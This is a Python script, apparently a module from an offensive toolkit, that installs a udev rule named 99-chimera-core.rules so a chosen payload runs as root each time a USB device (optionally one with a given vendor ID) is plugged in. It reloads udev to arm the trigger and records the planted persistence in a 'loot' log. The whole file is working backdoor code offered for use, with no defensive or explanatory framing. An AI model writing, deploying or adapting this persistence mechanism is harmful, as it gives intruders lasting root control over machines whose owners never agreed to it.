import os
import sys
import subprocess

def deploy_udev_backdoor(payload_path, vendor=None):
    """
    Weaponized Udev Persistence: Triggers a root-level callback every 
    time a USB device is inserted.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Udev rule modification requires UID 0.")
        sys.exit(1)

    if not os.path.exists(payload_path):
        print(f"[-] Payload not found: {payload_path}")
        return

    # Ensure payload is executable
    os.chmod(payload_path, 0o755)

    print(f"[*] Preparing Udev Rule for: {payload_path}")

    # Broad trigger: Any USB device insertion executes the payload as root
    rule_content = f'ACTION=="add", SUBSYSTEM=="usb", RUN+="{payload_path}"\n'
    
    # Optional: Target a specific hardware ID
    if vendor:
        rule_content = f'ACTION=="add", SUBSYSTEM=="usb", ATTR{{idVendor}}=="{vendor}", RUN+="{payload_path}"\n'

    rule_path = "/etc/udev/rules.d/99-chimera-core.rules"

    try:
        with open(rule_path, "w") as f:
            f.write(rule_content)
        
        print(f"[!] SUCCESS: Udev rule deployed to {rule_path}")
        
        # Reload udev to arm the trigger immediately
        print("[*] Reloading udevadm control...")
        subprocess.run(["udevadm", "control", "--reload-rules"], check=True)
        
        # Log to project loot
        loot_path = "../../../loot/persistence_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: UDEV | Payload: {payload_path} | Vendor: {vendor}\n")
        
        print("[!!!] PERSISTENCE ACTIVE: Insert a USB device to trigger.")

    except Exception as e:
        print(f"[-] Udev Deployment Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 147_udev_persistence <payload_path> [vendor_id_hex]")
        sys.exit(1)
    
    v = sys.argv[2] if len(sys.argv) > 2 else None
    deploy_udev_backdoor(sys.argv[1], v)
